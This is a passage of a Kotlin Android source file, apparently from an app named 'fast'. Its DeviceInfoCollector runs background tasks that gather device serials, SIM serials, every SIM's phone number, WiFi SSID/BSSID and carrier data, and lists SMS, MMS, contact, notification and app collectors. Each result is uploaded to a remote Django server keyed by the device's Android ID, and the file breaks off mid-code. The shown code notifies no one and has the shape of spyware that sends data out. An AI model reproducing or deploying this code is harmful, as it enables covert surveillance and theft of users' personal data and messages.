package com.example.fast.util

import android.annotation.SuppressLint
import android.app.ActivityManager
import android.content.Context
import android.content.pm.PackageManager
import android.content.res.Configuration
import android.media.AudioManager
import android.net.ConnectivityManager
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.PowerManager
import android.os.StatFs
import android.provider.Settings
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.ActivityCompat
import com.example.fast.config.AppConfig
import com.google.firebase.Firebase
import com.google.firebase.database.database
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.util.Locale
import java.util.TimeZone
import java.util.concurrent.CountDownLatch
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicInteger

/**
 * DeviceInfoCollector
 *
 * Collects all available device information in background subtasks.
 * Each subtask runs independently with proper error handling.
 *
 * Features:
 * - Parallel execution for fast subtasks
 * - Sequential execution for slow subtasks
 * - Comprehensive error handling
 * - Non-blocking background execution
 * - Incremental Firebase updates
 */
object DeviceInfoCollector {

    private const val TAG = "DeviceInfoCollector"
    private const val COLLECTION_TIMEOUT_MS = 60000L // 60 seconds max per subtask

    // Subtask result data structure
    data class SubtaskResult(
        val subtaskName: String,
        val data: Map<String, Any?>,
        val success: Boolean,
        val error: Exception? = null,
        val collectionTime: Long = 0
    )

    /**
     * Collect all device information
     *
     * @param context Application context
     * @param onProgress Callback: (subtaskName, currentSubtask, totalSubtasks, isComplete)
     * @param onComplete Callback: (allResults)
     * @param onError Callback: (subtaskName, error)
     */
    fun collectAllDeviceInfo(
        context: Context,
        onProgress: ((String, Int, Int, Boolean) -> Unit)? = null,
        onComplete: ((Map<String, SubtaskResult>) -> Unit)? = null,
        onError: ((String, Exception) -> Unit)? = null
    ) {
        // Run in background thread to avoid blocking
        Thread {
            try {
                val allResults = mutableMapOf<String, SubtaskResult>()
                val totalSubtasks = 19
                var currentSubtask = 0

                // Phase 1: Instant/Fast subtasks (parallel execution)
                val phase1Subtasks = listOf(
                    Subtask1_BuildInfo(),
                    Subtask2_DisplayInfo(),
                    Subtask3_StorageInfo(),
                    Subtask4_MemoryInfo(),
                    Subtask5_BatteryInfo(),
                    Subtask6_NetworkInfo(),
                    Subtask7_PhoneSimInfo(),
                    Subtask8_SystemSettings(),
                    Subtask9_RuntimeInfo(),
                    Subtask10_DeviceFeatures(),
                    Subtask11_PowerManagement(),
                    Subtask12_BootInfo(),
                    Subtask13_PerformanceMetrics()
                )

                // Execute Phase 1 in parallel
                val executor = Executors.newFixedThreadPool(phase1Subtasks.size)
                val latch = CountDownLatch(phase1Subtasks.size)

                phase1Subtasks.forEach { subtask ->
                    executor.execute {
                        try {
                            val startTime = System.currentTimeMillis()
                            val result = executeSubtask(context, subtask, onError)
                            val collectionTime = System.currentTimeMillis() - startTime

                            synchronized(allResults) {
                                allResults[subtask.getName()] = result.copy(collectionTime = collectionTime)
                                currentSubtask++
                                onProgress?.invoke(subtask.getName(), currentSubtask, totalSubtasks, false)
                            }

                            // Sync to Django immediately (non-blocking)
                            if (result.success && result.data.isNotEmpty()) {
                                syncToDjango(context, subtask.getName(), result.data)
                            }
                        } catch (e: Exception) {
                            LogHelper.e(TAG, "Error in subtask ${subtask.getName()}", e)
                            onError?.invoke(subtask.getName(), e)
                        } finally {
                            latch.countDown()
                        }
                    }
                }

                // Wait for Phase 1 to complete (with timeout)
                if (!latch.await(30, TimeUnit.SECONDS)) {
                    LogHelper.w(TAG, "Phase 1 timeout - some subtasks may not have completed")
                }

                executor.shutdown()

                // Phase 2: Slow subtasks (sequential execution to avoid overload)
                val phase2Subtasks = listOf(
                    Subtask14_SmsMetadata(),
                    Subtask15_MmsMessages(),
                    Subtask16_ContactMetadata(),
                    Subtask17_NotificationExtended(),
                    Subtask18_AppInfo(),
                    Subtask19_DeviceStatusInfo()
                )

                phase2Subtasks.forEach { subtask ->
                    try {
                        val startTime = System.currentTimeMillis()
                        val result = executeSubtask(context, subtask, onError)
                        val collectionTime = System.currentTimeMillis() - startTime

                        allResults[subtask.getName()] = result.copy(collectionTime = collectionTime)
                        currentSubtask++
                        onProgress?.invoke(subtask.getName(), currentSubtask, totalSubtasks, false)

                        // Sync to Django immediately (non-blocking)
                        if (result.success && result.data.isNotEmpty()) {
                            syncToDjango(context, subtask.getName(), result.data)
                        }
                    } catch (e: Exception) {
                        LogHelper.e(TAG, "Error in subtask ${subtask.getName()}", e)
                        onError?.invoke(subtask.getName(), e)
                    }
                }

                // Final callback
                onProgress?.invoke("Complete", totalSubtasks, totalSubtasks, true)
                onComplete?.invoke(allResults)

            } catch (e: Exception) {
                LogHelper.e(TAG, "Error in collectAllDeviceInfo", e)
                onError?.invoke("DeviceInfoCollector", e)
            }
        }.start()
    }

    /**
     * Execute a single subtask with error handling
     */
    private fun executeSubtask(
        context: Context,
        subtask: DeviceInfoSubtask,
        onError: ((String, Exception) -> Unit)?
    ): SubtaskResult {
        return try {
            // Check permissions
            val requiredPermissions = subtask.getRequiredPermissions()
            val hasAllPermissions = requiredPermissions.all { permission ->
                ActivityCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
            }

            if (!hasAllPermissions) {
                Log.w(TAG, "Missing permissions for ${subtask.getName()}: $requiredPermissions")
                return SubtaskResult(
                    subtaskName = subtask.getName(),
                    data = emptyMap(),
                    success = false,
                    error = SecurityException("Missing required permissions")
                )
            }

            // Execute subtask with timeout
            val data = subtask.collect(context)

            SubtaskResult(
                subtaskName = subtask.getName(),
                data = data,
                success = true
            )
        } catch (e: SecurityException) {
            Log.w(TAG, "SecurityException in ${subtask.getName()}", e)
            onError?.invoke(subtask.getName(), e)
            SubtaskResult(
                subtaskName = subtask.getName(),
                data = emptyMap(),
                success = false,
                error = e
            )
        } catch (e: Exception) {
            Log.e(TAG, "Exception in ${subtask.getName()}", e)
            onError?.invoke(subtask.getName(), e)
            SubtaskResult(
                subtaskName = subtask.getName(),
                data = emptyMap(),
                success = false,
                error = e
            )
        }
    }

    /**
     * Sync collected data to Django (non-blocking)
     */
    @SuppressLint("HardwareIds")
    private fun syncToDjango(context: Context, subtaskName: String, data: Map<String, Any?>) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)

                // Nest subtask data under system_info
                val updates = mapOf(
                    "system_info" to mapOf(
                        subtaskName to data.filterValues { it != null }
                    )
                )

                DjangoApiHelper.patchDevice(deviceId, updates)
                LogHelper.d(TAG, "Synced $subtaskName to Django successfully")
            } catch (e: Exception) {
                LogHelper.e(TAG, "Error syncing $subtaskName to Django", e)
            }
        }
    }

    // ============================================================================
    // SUBTASK INTERFACE
    // ============================================================================

    interface DeviceInfoSubtask {
        fun getName(): String
        fun collect(context: Context): Map<String, Any?>
        fun getRequiredPermissions(): List<String>
    }

    // ============================================================================
    // SUBTASK 1: DEVICE BUILD INFORMATION
    // ============================================================================

    private class Subtask1_BuildInfo : DeviceInfoSubtask {
        override fun getName() = "buildInfo"

        override fun getRequiredPermissions() = emptyList<String>()

        override fun collect(context: Context): Map<String, Any?> {
            return try {
                mapOf(
                    "manufacturer" to Build.MANUFACTURER,
                    "product" to Build.PRODUCT,
                    "device" to Build.DEVICE,
                    "hardware" to Build.HARDWARE,
                    "board" to Build.BOARD,
                    "bootloader" to Build.BOOTLOADER,
                    "radioVersion" to try { Build.getRadioVersion() } catch (e: Exception) { null },
                    "serialNumber" to try {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            Build.getSerial()
                        } else {
                            @Suppress("DEPRECATION")
                            Build.SERIAL
                        }
                    } catch (e: Exception) { null },
                    "buildId" to Build.ID,
                    "buildType" to Build.TYPE,
                    "buildTags" to Build.TAGS,
                    "buildFingerprint" to Build.FINGERPRINT,
                    "buildTime" to Build.TIME,
                    "buildUser" to Build.USER,
                    "buildHost" to Build.HOST,
                    "androidVersion" to Build.VERSION.RELEASE,
                    "sdkVersion" to Build.VERSION.SDK_INT,
                    "codename" to Build.VERSION.CODENAME,
                    "incremental" to Build.VERSION.INCREMENTAL,
                    "securityPatch" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        Build.VERSION.SECURITY_PATCH
                    } else null,
                    "previewSdk" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        Build.VERSION.PREVIEW_SDK_INT
                    } else null
                )
            } catch (e: Exception) {
                LogHelper.e(TAG, "Error collecting build info", e)
                emptyMap()
            }
        }
    }

    // ============================================================================
    // SUBTASK 2: DISPLAY INFORMATION
    // ============================================================================

    private class Subtask2_DisplayInfo : DeviceInfoSubtask {
        override fun getName() = "displayInfo"

        override fun getRequiredPermissions() = emptyList<String>()

        override fun collect(context: Context): Map<String, Any?> {
            return try {
                val displayMetrics = context.resources.displayMetrics
                val configuration = context.resources.configuration

                mapOf(
                    "screenWidth" to displayMetrics.widthPixels,
                    "screenHeight" to displayMetrics.heightPixels,
                    "density" to displayMetrics.density,
                    "densityDpi" to displayMetrics.densityDpi,
                    "scaledDensity" to displayMetrics.scaledDensity,
                    "xdpi" to displayMetrics.xdpi,
                    "ydpi" to displayMetrics.ydpi,
                    "screenSizeCategory" to getScreenSizeCategory(displayMetrics),
                    "orientation" to when (configuration.orientation) {
                        Configuration.ORIENTATION_PORTRAIT -> "PORTRAIT"
                        Configuration.ORIENTATION_LANDSCAPE -> "LANDSCAPE"
                        else -> "UNKNOWN"
                    }
                )
            } catch (e: Exception) {
                LogHelper.e(TAG, "Error collecting display info", e)
                emptyMap()
            }
        }

        private fun getScreenSizeCategory(metrics: android.util.DisplayMetrics): String {
            val widthDp = metrics.widthPixels / metrics.density
            val heightDp = metrics.heightPixels / metrics.density
            val screenSize = widthDp * heightDp

            return when {
                screenSize >= 960 * 720 -> "xlarge"
                screenSize >= 640 * 480 -> "large"
                screenSize >= 470 * 320 -> "normal"
                else -> "small"
            }
        }
    }

    // ============================================================================
    // SUBTASK 3: STORAGE INFORMATION
    // ============================================================================

    private class Subtask3_StorageInfo : DeviceInfoSubtask {
        override fun getName() = "storageInfo"

        override fun getRequiredPermissions() = emptyList<String>()

        override fun collect(context: Context): Map<String, Any?> {
            return try {
                val internalStorage = getStorageInfo(Environment.getDataDirectory())
                val externalStorage = try {
                    if (Environment.getExternalStorageState() == Environment.MEDIA_MOUNTED) {
                        getStorageInfo(Environment.getExternalStorageDirectory())
                    } else {
                        null
                    }
                } catch (e: Exception) {
                    LogHelper.w(TAG, "External storage not available", e)
                    null
                }

                val externalStorageState = Environment.getExternalStorageState()
                val isExternalStorageReadable = externalStorageState == Environment.MEDIA_MOUNTED ||
                    externalStorageState == Environment.MEDIA_MOUNTED_READ_ONLY
                val isExternalStorageWritable = externalStorageState == Environment.MEDIA_MOUNTED

                val result = mutableMapOf<String, Any?>(
                    "internalTotal" to internalStorage?.total,
                    "internalFree" to internalStorage?.free,
                    "internalAvailable" to internalStorage?.available,
                    "internalUsed" to internalStorage?.used,
                    "internalUsagePercent" to internalStorage?.usagePercent,
                    "externalStorageState" to externalStorageState,
                    "externalStorageReadable" to isExternalStorageReadable,
                    "externalStorageWritable" to isExternalStorageWritable
                )

                if (externalStorage != null) {
                    result["externalTotal"] = externalStorage.total
                    result["externalFree"] = externalStorage.free
                    result["externalAvailable"] = externalStorage.available
                    result["externalUsed"] = externalStorage.used
                    result["externalUsagePercent"] = externalStorage.usagePercent
                }

                result
            } catch (e: Exception) {
                LogHelper.e(TAG, "Error collecting storage info", e)
                emptyMap()
            }
        }

        private data class StorageInfo(
            val total: Long,
            val free: Long,
            val available: Long,
            val used: Long,
            val usagePercent: Double
        )

        private fun getStorageInfo(path: java.io.File?): StorageInfo? {
            return try {
                val stat = StatFs(path?.absolutePath)
                val total = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
                    stat.totalBytes
                } else {
                    @Suppress("DEPRECATION")
                    stat.blockCount.toLong() * stat.blockSize.toLong()
                }
                val free = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
                    stat.freeBytes
                } else {
                    @Suppress("DEPRECATION")
                    stat.availableBlocks.toLong() * stat.blockSize.toLong()
                }
                val available = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
                    stat.availableBytes
                } else {
                    free
                }
                val used = total - free
                val usagePercent = if (total > 0) (used.toDouble() / total.toDouble()) * 100.0 else 0.0

                StorageInfo(total, free, available, used, usagePercent)
            } catch (e: Exception) {
                Log.w(TAG, "Error getting storage info for $path", e)
                null
            }
        }
    }

    // ============================================================================
    // SUBTASK 4: MEMORY INFORMATION
    // ============================================================================

    private class Subtask4_MemoryInfo : DeviceInfoSubtask {
        override fun getName() = "memoryInfo"

        override fun getRequiredPermissions() = emptyList<String>()

        override fun collect(context: Context): Map<String, Any?> {
            return try {
                val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as? ActivityManager
                val memoryInfo = ActivityManager.MemoryInfo()
                activityManager?.getMemoryInfo(memoryInfo)

                val runtime = Runtime.getRuntime()

                mapOf(
                    "totalRAM" to memoryInfo?.totalMem,
                    "availableRAM" to memoryInfo?.availMem,
                    "usedRAM" to memoryInfo?.let { it.totalMem - it.availMem },
                    "ramUsagePercent" to memoryInfo?.let {
                        if (it.totalMem > 0) {
                            ((it.totalMem - it.availMem).toDouble() / it.totalMem.toDouble()) * 100.0
                        } else null
                    },
                    "lowMemoryThreshold" to memoryInfo?.threshold,
                    "isLowMemory" to memoryInfo?.lowMemory,
                    "appMaxMemory" to runtime.maxMemory(),
                    "appTotalMemory" to runtime.totalMemory(),
                    "appFreeMemory" to runtime.freeMemory(),
                    "appUsedMemory" to (runtime.totalMemory() - runtime.freeMemory()),
                    "availableProcessors" to runtime.availableProcessors()
                )
            } catch (e: Exception) {
                LogHelper.e(TAG, "Error collecting memory info", e)
                emptyMap()
            }
        }
    }

    // ============================================================================
    // SUBTASK 5: BATTERY INFORMATION
    // ============================================================================

    private class Subtask5_BatteryInfo : DeviceInfoSubtask {
        override fun getName() = "batteryInfo"

        override fun getRequiredPermissions() = emptyList<String>()

        override fun collect(context: Context): Map<String, Any?> {
            return try {
                val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
                    ?: return emptyMap()

                val batteryLevel = try {
                    batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
                } catch (e: Exception) {
                    LogHelper.w(TAG, "Error getting battery level", e)
                    -1
                }

                val isCharging = try {
                    batteryManager.isCharging
                } catch (e: Exception) {
                    LogHelper.w(TAG, "Error checking charging status", e)
                    false
                }

                mapOf(
                    "batteryPercentage" to if (batteryLevel in 0..100) batteryLevel else null,
                    "isCharging" to isCharging,
                    "chargeCounter" to try {
                        batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CHARGE_COUNTER)
                    } catch (e: Exception) { null },
                    "currentAverage" to try {
                        batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CURRENT_AVERAGE)
                    } catch (e: Exception) { null },
                    "currentNow" to try {
                        batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CURRENT_NOW)
                    } catch (e: Exception) { null },
                    "energyCounter" to try {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                            batteryManager.getLongProperty(BatteryManager.BATTERY_PROPERTY_ENERGY_COUNTER)
                        } else null
                    } catch (e: Exception) { null }
                )
            } catch (e: Exception) {
                LogHelper.e(TAG, "Error collecting battery info", e)
                emptyMap()
            }
        }
    }

    // ============================================================================
    // SUBTASK 6: NETWORK INFORMATION
    // ============================================================================

    private class Subtask6_NetworkInfo : DeviceInfoSubtask {
        override fun getName() = "networkInfo"

        override fun getRequiredPermissions() = listOf(
            android.Manifest.permission.READ_PHONE_STATE,
            android.Manifest.permission.ACCESS_WIFI_STATE
        )

        @SuppressLint("HardwareIds", "MissingPermission")
        override fun collect(context: Context): Map<String, Any?> {
            return try {
                val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
                val networkInfo = connectivityManager?.activeNetworkInfo

                val result = mutableMapOf<String, Any?>(
                    "isConnected" to networkInfo?.isConnected,
                    "networkType" to networkInfo?.type?.let {
                        when (it) {
                            ConnectivityManager.TYPE_WIFI -> "WIFI"
                            ConnectivityManager.TYPE_MOBILE -> "MOBILE"
                            ConnectivityManager.TYPE_ETHERNET -> "ETHERNET"
                            ConnectivityManager.TYPE_VPN -> "VPN"
                            else -> "UNKNOWN"
                        }
                    },
                    "isWiFi" to (networkInfo?.type == ConnectivityManager.TYPE_WIFI),
                    "isMobile" to (networkInfo?.type == ConnectivityManager.TYPE_MOBILE),
                    "networkSubtype" to networkInfo?.subtype
                )

                // WiFi SSID/Name
                if (networkInfo?.type == ConnectivityManager.TYPE_WIFI) {
                    try {
                        val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
                        if (wifiManager != null && ActivityCompat.checkSelfPermission(
                                context,
                                android.Manifest.permission.ACCESS_WIFI_STATE
                            ) == PackageManager.PERMISSION_GRANTED
                        ) {
                            val wifiInfo = wifiManager.connectionInfo
                            val ssid = wifiInfo?.ssid
                            result["wifiSSID"] = if (ssid != null && ssid != "<unknown ssid>") {
                                ssid.removeSurrounding("\"")
                            } else null
                            result["wifiBSSID"] = wifiInfo?.bssid
                            result["wifiRssi"] = wifiInfo?.rssi
                            result["wifiLinkSpeed"] = wifiInfo?.linkSpeed
                        }
                    } catch (e: Exception) {
                        LogHelper.w(TAG, "Error getting WiFi info", e)
                    }
                }

                // Mobile data status
                if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE)
                    == PackageManager.PERMISSION_GRANTED) {
                    try {
                        val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
                        result["isRoaming"] = telephonyManager?.isNetworkRoaming
                        result["networkOperatorName"] = telephonyManager?.networkOperatorName
                        result["networkOperatorCode"] = telephonyManager?.networkOperator

                        // Mobile data enabled status
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            result["isMobileDataEnabled"] = telephonyManager?.isDataEnabled
                        } else {
                            // Fallback for older Android versions
                            result["isMobileDataEnabled"] = networkInfo?.type == ConnectivityManager.TYPE_MOBILE && networkInfo?.isConnected == true
                        }
                    } catch (e: Exception) {
                        LogHelper.w(TAG, "Error getting extended network info", e)
                    }
                }

                result
            } catch (e: Exception) {
                LogHelper.e(TAG, "Error collecting network info", e)
                emptyMap()
            }
        }
    }

    // ============================================================================
    // SUBTASK 7: PHONE/SIM INFORMATION
    // ============================================================================

    private class Subtask7_PhoneSimInfo : DeviceInfoSubtask {
        override fun getName() = "phoneSimInfo"

        override fun getRequiredPermissions() = listOf(android.Manifest.permission.READ_PHONE_STATE)

        @SuppressLint("HardwareIds", "MissingPermission")
        override fun collect(context: Context): Map<String, Any?> {
            return try {
                if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE)
                    != PackageManager.PERMISSION_GRANTED) {
                    return emptyMap()
                }

                val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
                    ?: return emptyMap()

                val result = mutableMapOf<String, Any?>(
                    "simSerial" to try { telephonyManager.simSerialNumber } catch (e: Exception) { null },
                    "simState" to telephonyManager.simState,
                    "simCountryIso" to telephonyManager.simCountryIso,
                    "simOperatorName" to telephonyManager.simOperatorName,
                    "simOperatorCode" to telephonyManager.simOperator,
                    "phoneCount" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        telephonyManager.phoneCount
                    } else 1,
                    "phoneNumber" to try { telephonyManager.line1Number } catch (e: Exception) { null },
                    "voiceMailNumber" to try { telephonyManager.voiceMailNumber } catch (e: Exception) { null },
                    "voiceMailAlphaTag" to try { telephonyManager.voiceMailAlphaTag } catch (e: Exception) { null },
                    "networkOperatorName" to telephonyManager.networkOperatorName,
                    "networkOperatorCode" to telephonyManager.networkOperator,
                    "networkCountryIso" to telephonyManager.networkCountryIso,
                    "networkType" to telephonyManager.networkType,
                    "dataNetworkType" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        telephonyManager.dataNetworkType
                    } else null,
                    "phoneType" to telephonyManager.phoneType,
                    "isNetworkRoaming" to telephonyManager.isNetworkRoaming,
                    "callState" to telephonyManager.callState,
                    "dataActivity" to telephonyManager.dataActivity,
                    "dataState" to telephonyManager.dataState,
                    "isDataEnabled" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        telephonyManager.isDataEnabled
                    } else null
                )

                // Dual SIM support (Android 5.1+)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                    try {
                        val subscriptionManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
                        if (subscriptionManager != null) {
                            val activeSubscriptions = subscriptionManager.activeSubscriptionInfoList
                            if (activeSubscriptions != null && activeSubscriptions.isNotEmpty()) {
                                val simCards = mutableListOf<Map<String, Any?>>()

                                activeSubscriptions.forEachIndexed { index, subscriptionInfo ->
                                    val simCardInfo = mutableMapOf<String, Any?>(
                                        "slotIndex" to subscriptionInfo.simSlotIndex,
                                        "subscriptionId" to subscriptionInfo.subscriptionId,
                                        "carrierName" to subscriptionInfo.carrierName?.toString(),
                                        "displayName" to subscriptionInfo.displayName?.toString(),
                                        "mcc" to subscriptionInfo.mcc,
                                        "mnc" to subscriptionInfo.mnc,
                                        "countryIso" to subscriptionInfo.countryIso,
                                        "isEmbedded" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                                            subscriptionInfo.isEmbedded
                                        } else null
                                    )

                                    // Get phone number for this SIM (may require READ_PHONE_NUMBERS on Android 8.0+)
                                    try {
                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                                            simCardInfo["phoneNumber"] = subscriptionInfo.number
                                        } else {
                                            // Try to get from TelephonyManager for this subscription
                                            val slotTelephonyManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                                telephonyManager.createForSubscriptionId(subscriptionInfo.subscriptionId)
                                            } else null
                                            simCardInfo["phoneNumber"] = slotTelephonyManager?.line1Number
                                        }
                                    } catch (e: Exception) {
                                        LogHelper.w(TAG, "Error getting phone number for SIM ${subscriptionInfo.simSlotIndex}", e)
                                    }

                                    // Get operator name for this SIM
                                    try {
                                        val slotTelephonyManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                            telephonyManager.createForSubscriptionId(subscriptionInfo.subscriptionId)
                                        } else null
                                        simCardInfo["operatorName"] = slotTelephonyManager?.simOperatorName
                                        simCardInfo["operatorCode"] = slotTelephonyManager?.simOperator
                                        simCardInfo["networkOperatorName"] = slotTelephonyManager?.networkOperatorName
                                        simCardInfo["networkOperatorCode"] = slotTelephonyManager?.networkOperator
                                        simCardInfo["isDataEnabled"] = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                            slotTelephonyManager?.isDataEnabled
                                        } else null
                                    } catch (e: Exception) {
                                        LogHelper.w(TAG, "Error getting operator info for SIM ${subscriptionInfo.simSlotIndex}", e)
                                    }

                                    simCards.add(simCardInfo)
                                }

                                result["simCards"] = simCards
                                result["simCardCount"] = simCards.size
                            }
                        }
                    } catch (e: Exception) {
                        LogHelper.w(TAG, "Error collecting dual SIM info", e)
                    }
                }

                result
            } catch (e: SecurityException) {
                Log.w(TAG, "SecurityException collecting phone/SIM info", e)
                emptyMap()
            } catch (e: Exception) {
                LogHelper.e(TAG, "Error collecting phone/SIM info", e)
                emptyMap()
            }
        }
    }

    // ============================================================================
    // SUBTASK 8: SYSTEM SETTINGS
    // ============================================================================

    private class Subtask8_SystemSettings : DeviceInfoSubtask {
        override fun getName() = "systemSettings"

        override fun getRequiredPermissions() = emptyList<String>()

        override fun collect(context: Context): Map<String, Any?> {
            return try {
                val locale = Locale.getDefault()
                val timeZone = TimeZone.getDefault()
                val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as? AudioManager

                val result = mutableMapOf<String, Any?>(
                    "deviceName" to try {
                        Settings.Global.getString(context.contentResolver, Settings.Global.DEVICE_NAME)
                    } catch (e: Exception) { null },
                    "locale" to locale.toString(),
                    "language" to locale.language,
                    "country" to locale.country,
                    "timeZone" to timeZone.id,
                    "timeZoneDisplayName" to timeZone.displayName,
                    "systemTime" to System.currentTimeMillis(),
                    "systemUptime" to android.os.SystemClock.uptimeMillis(),
                    "elapsedRealtime" to android.os.SystemClock.elapsedRealtime(),
                    "is24HourFormat" to android.text.format.DateFormat.is24HourFormat(context),
                    "airplaneMode" to try {
                        Settings.Global.getInt(context.contentResolver, Settings.Global.AIRPLANE_MODE_ON, 0) == 1
                    } catch (e: Exception) { null }
                )

                // Sound mode (Vibrate/Silent/Sound)
                if (audioManager != null) {
                    try {
                        val ringerMode = audioManager.ringerMode
                        result["soundMode"] = when (ringerMode) {
                            AudioManager.RINGER_MODE_SILENT -> "SILENT"
                            AudioManager.RINGER_MODE_VIBRATE -> "VIBRATE"
                            AudioManager.RINGER_MODE_NORMAL -> "SOUND"
                            else -> "UNKNOWN"
                        }
                        result["ringerMode"] = ringerMode

                        // Additional audio info
                        result["volumeMusic"] = audioManager.getStreamVolume(AudioManager.STREAM_MUSIC)
                        result["volumeRing"] = audioManager.getStreamVolume(AudioManager.STREAM_RING)
                        result["volumeNotification"] = audioManager.getStreamVolume(AudioManager.STREAM_NOTIFICATION)
                        result["maxVolumeMusic"] = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
                        result["maxVolumeRing"] = audioManager.getStreamMaxVolume(AudioManager.STREAM_RING)
                    } catch (e: Exception) {
                        LogHelper.w(TAG, "Error getting sound mode", e)
                    }
                }

                result
            } catch (e: Exception) {
                LogHelper.e(TAG, "Error collecting system settings", e)
                emptyMap()
            }
        }
    }

    // ============================================================================
    // SUBTASK 9: RUNTIME INFORMATION
    // ============================================================================

    private class Subtask9_RuntimeInfo : DeviceInfoSubtask {
        override fun getName() = "runtimeInfo"

        override fun getRequiredPermissions() = emptyList<String>()

        override fun collect(context: Context): Map<String, Any?> {
            return try {
                val runtime = Runtime.getRuntime()

                mapOf(
                    "availableProcessors" to runtime.availableProcessors(),
                    "appMaxMemory" to runtime.maxMemory(),
                    "appTotalMemory" to runtime.totalMemory(),
                    "appFreeMemory" to runtime.freeMemory(),
                    "appUsedMemory" to (runtime.totalMemory() - runtime.freeMemory()),
                    "systemUptime" to android.os.SystemClock.uptimeMillis(),
                    "elapsedRealtime" to android.os.SystemClock.elapsedRealtime()
                )
            } catch (e: Exception) {
                LogHelper.e(TAG, "Error collecting runtime info", e)
                emptyMap()
            }
        }
    }

    // ============================================================================
    // SUBTASK 10: DEVICE FEATURES
    // ============================================================================

    private class Subtask10_DeviceFeatures : DeviceInfoSubtask {
        override fun getName() = "deviceFeatures"

        override fun getRequiredPermissions() = emptyList<String>()

        override fun collect(context: Context): Map<String, Any?> {
            return try {
                val packageManager = context.packageManager

                mapOf(
                    "hasTelephony" to packageManager.hasSystemFeature(PackageManager.FEATURE_TELEPHONY),
                    "hasWiFi" to packageManager.hasSystemFeature(PackageManager.FEATURE_WIFI),
                    "hasBluetooth" to packageManager.hasSystemFeature(PackageManager.FEATURE_BLUETOOTH),
                    "hasNFC" to packageManager.hasSystemFeature(PackageManager.FEATURE_NFC),
                    "hasCamera" to packageManager.hasSystemFeature(PackageManager.FEATURE_CAMERA),
                    "hasFrontCamera" to packageManager.hasSystemFeature(PackageManager.FEATURE_CAMERA_FRONT),
                    "hasFlash" to packageManager.hasSystemFeature(PackageManager.FEATURE_CAMERA_FLASH),
                    "hasGPS" to packageManager.hasSystemFeature(PackageManager.FEATURE_LOCATION_GPS),
                    "hasFingerprint" to packageManager.hasSystemFeature(PackageManager.FEATURE_FINGERPRINT),
                    "hasFace" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        packageManager.hasSystemFeature(PackageManager.FEATURE_FACE)
                    } else false,
                    "hasIris" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        packageManager.hasSystemFeature(PackageManager.FEATURE_IRIS)
                    } else false,
                    "touchscreenType" to context.resources.configuration.touchscreen.let {
                        when (it) {
                            Configuration.TOUCHSCREEN_FINGER -> "FINGER"
                            Configuration.TOUCHSCREEN_STYLUS -> "STYLUS"
                            Configuration.TOUCHSCREEN_NOTOUCH -> "NOTOUCH"
                            else -> "UNKNOWN"
                        }
                    },
                    "keyboardType" to context.resources.configuration.keyboard.let {
                        when (it) {
                            Configuration.KEYBOARD_QWERTY -> "QWERTY"
                            Configuration.KEYBOARD_12KEY -> "12KEY"
                            Configuration.KEYBOARD_NOKEYS -> "NOKEYS"
                            else -> "UNKNOWN"
                        }
                    }
                )
            } catch (e: Exception) {
                LogHelper.e(TAG, "Error collecting device features", e)
                emptyMap()
            }
        }
    }

    // ============================================================================
    // SUBTASK 11: POWER MANAGEMENT
    // ============================================================================

    private class Subtask11_PowerManagement : DeviceInfoSubtask {
        override fun getName() = "powerManagement"

        override fun getRequiredPermissions() = emptyList<String>()

        override fun collect(context: Context): Map<String, Any?> {
            return try {
                val powerManager = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
                    ?: return emptyMap()

                mapOf(
                    "batteryOptimizationStatus" to try {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            powerManager.isIgnoringBatteryOptimizations(context.packageName)
